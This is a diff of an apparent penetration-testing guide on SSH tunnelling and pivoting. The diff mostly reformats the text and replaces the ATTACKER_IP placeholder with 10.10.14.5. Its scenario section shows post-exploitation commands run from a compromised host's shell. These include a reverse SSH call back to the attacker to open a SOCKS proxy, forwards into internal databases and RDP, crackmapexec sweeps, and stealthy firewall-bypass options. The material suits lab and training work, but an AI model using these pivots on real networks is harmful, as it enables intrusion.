@@ -6,8 +6,6 @@
 
 ---
 
-SSH `-L` / `-R` / `-D` tunnels for pivoting when OpenSSH is already on the host.
-
 ## SSH Tunnel Types
 
 ### Local Port Forward (-L)
@@ -249,7 +247,7 @@ proxychains psql -h 192.168.1.50 -p 5432
 ### Scenario: Got RCE, Need Persistent Access
 
 ```bash
-# ===== YOU: Attacker at ATTACKER_IP =====
+# ===== YOU: Attacker at 10.10.14.5 =====
 # THEM: Compromised target at 192.168.10.50
 # PROBLEM: Unstable nc shell from complex exploit
 
@@ -262,7 +260,7 @@ sudo systemctl restart ssh
 
 # STEP 2: From target's nc shell - upgrade and tunnel back
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-ssh -R 1080 -o ServerAliveInterval=60 kali@ATTACKER_IP
+ssh -R 1080 -o ServerAliveInterval=60 kali@10.10.14.5
 # Keep this session alive!
 
 # STEP 3: On attacker - explore target's network
@@ -276,7 +274,7 @@ proxychains crackmapexec smb 192.168.10.0/24
 
 # STEP 5: Add specific reverse forwards as needed
 # From target (in another session or terminate and restart)
-ssh -R 5432:192.168.10.23:5432 -R 3389:192.168.10.100:3389 kali@ATTACKER_IP
+ssh -R 5432:192.168.10.23:5432 -R 3389:192.168.10.100:3389 kali@10.10.14.5
 
 # On attacker - direct access without proxychains
 psql -h localhost -p 5432
@@ -327,7 +325,7 @@ proxychains ssh -L 5432:postgres.internal:5432 admin@192.168.10.50
 
 ### Using Built-in Tools
 
-### Netsh (Windows)
+#### Netsh (Windows)
 
 ```cmd
 # Port forwarding on Windows (requires admin)
@@ -340,7 +338,7 @@ netsh interface portproxy show all
 netsh interface portproxy delete v4tov4 listenport=8080
 ```
 
-### Socat (If Available)
+#### Socat (If Available)
 
 ```bash
 # Check if socat installed
@@ -353,7 +351,7 @@ socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80
 socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80 &
 ```
 
-### Iptables (Linux with root)
+#### Iptables (Linux with root)
 
 ```bash
 # Enable IP forwarding
@@ -366,7 +364,7 @@ iptables -t nat -A POSTROUTING -j MASQUERADE
 
 ### SSH Alternatives (Stealthy)
 
-### Using RDP for Tunneling
+#### Using RDP for Tunneling
 
 ```bash
 # If RDP available, can tunnel through it
@@ -375,7 +373,7 @@ xfreerdp /v:target /u:user /p:pass /drive:share,/tmp
 # Then use SMB or other services through RDP
 ```
 
-### Windows Remote Management (WinRM)
+#### Windows Remote Management (WinRM)
 
 ```powershell
 # If WinRM available (port 5985/5986)
@@ -444,18 +442,18 @@ proxychains nmap -sT 192.168.1.0/24
 
 **Use SSH when**:
 
-- SSH is already installed on target
-- Stealth is priority
-- You have SSH credentials or keys
-- SSH traffic is normal in environment
+- ✅ SSH is already installed on target
+- ✅ Stealth is priority
+- ✅ You have SSH credentials or keys
+- ✅ SSH traffic is normal in environment
 
 **Use Chisel when**:
 
-- No SSH available (Windows servers)
-- Don't have SSH credentials
-- Need HTTP-based tunnel (firewall bypass)
-- Simpler syntax preferred
-- Stealth is not critical
+- ✅ No SSH available (Windows servers)
+- ✅ Don't have SSH credentials
+- ✅ Need HTTP-based tunnel (firewall bypass)
+- ✅ Simpler syntax preferred
+- ✅ Stealth is not critical
 
 ## Troubleshooting
 
@@ -502,8 +500,6 @@ proxychains curl http://192.168.1.10
 proxychains4 -v nmap -sT 192.168.1.10
 ```
 
-## Resources
+## Additional Resources
 
-- [OpenSSH](https://www.openssh.com/) — `-L` / `-R` / `-D` in `ssh(1)`
-- [proxychains](https://github.com/haad/proxychains) — SOCKS wrapper used with `-D`
-- [HackTricks — Pivoting](https://book.hacktricks.xyz/generic-methodologies-and-resources/tunneling-and-port-forwarding) — extra tunnel variants
+**Proxychains** https://github.com/haad/proxychains
